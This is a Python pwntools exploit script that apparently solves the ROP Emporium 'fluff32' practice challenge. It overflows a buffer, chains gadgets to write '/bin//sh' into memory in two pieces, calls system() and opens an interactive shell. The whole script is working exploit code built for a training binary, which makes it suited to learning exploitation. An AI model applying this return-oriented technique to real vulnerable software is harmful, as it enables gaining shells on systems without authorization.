#!/usr/bin/env python3

from pwn import *

pwn = process("./fluff32")
#gdb.attach(pwn, '''
#break main
#''')

#------------------- TOYS ------------------------#
junk = b'A' * 44

pop_ebx = p32(0x080483e1) # pop ebx; ret;
ecx_gadget = p32(0x08048689) # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
zero_edx = p32(0x08048671) # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
xor_edx = p32(0x0804867b) # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
www_gadget = p32(0x08048693) # mov DWORD PTR [ecx], edx; pop ebp; pop ebx; xor BYTE PTR [ecx], bl; ret
inc_ecx = p32(0x080488ba) # inc ecx; ret;

call_system = p32(0x0804865a) 


filler = b'\x42\x42\x42\x42'
null = b'\x00\x00\x00\x00'

what1 = b'\x69\x62\x2f\x2f'
what2 = b'\x68\x73\x2f\x6e'

where1 = p32(0x0804a040)
where2 = p32(0x0804a044)

buf = junk
#------------------- TOYS ------------------------#


#----objective1, get where1 into ecx----# 
buf += pop_ebx
buf += where1
buf += zero_edx 
buf += filler # gets popped into esi, ebp == 0xcafebabe
buf += xor_edx # edx now holds where1
buf += filler # gets popped into ebp, edi == 0xdeadbabe
buf += ecx_gadget # ecx now holds where1
buf += filler # gets popped into ebp, edx == 0xdefaced0

'''
AFFECTED REGISTERS NOW:
ebx = where1
ecx = where1
edx = 0xdefaced0
ebp = filler
esi = filler
edi = 0xdeadbabe
'''

#----objective2, get what1 into what1 into edx----#
buf += pop_ebx
buf += b'\xff\xe1\x98\xb7' # when xor'd with 0xdefaced0
buf += xor_edx # edx now == what1
buf += filler # gets popped into ebp

'''
AFFECTED REGISTERS NOW:
ebx = xor value of 0xf1d5acb3
ecx = where1
edx = what1
ebp = filler
esi = filler
edi = 0xdeadbabe
'''

#---objective3, do the write operation----#
buf += www_gadget
buf += filler # gets popped into ebp
buf += null # gets popped into ebx, we need this null because there is an xor with bl

'''
AFFECTED REGISTERS NOW:
ebx = 0x0
ecx = where1
edx = what1
ebp = filler
esi = filler
edi = 0xdeadbabe
'''

#---objective4, get where2 into ecx----#
buf += inc_ecx
buf += inc_ecx
buf += inc_ecx
buf += inc_ecx # where1 + 0x4 == where2

#---objective5, get what2 into edx----#
buf += pop_ebx
buf += b'\x41\x00\x11\x01' # edx == what1 still, xor with this value to get what2
buf += xor_edx # xor edx, ebx; 
buf += filler # filler in ebp, edi == 0xdeadbabe

#---objective6, complete 2nd write operation----#
buf += www_gadget
buf += filler # gets popped into ebp
buf += null # gets popped into ebx, we need this null because there is an xor with bl

#---objective7, call system----#
buf += call_system
buf += where1


pwn.sendline(buf)
pwn.interactive()
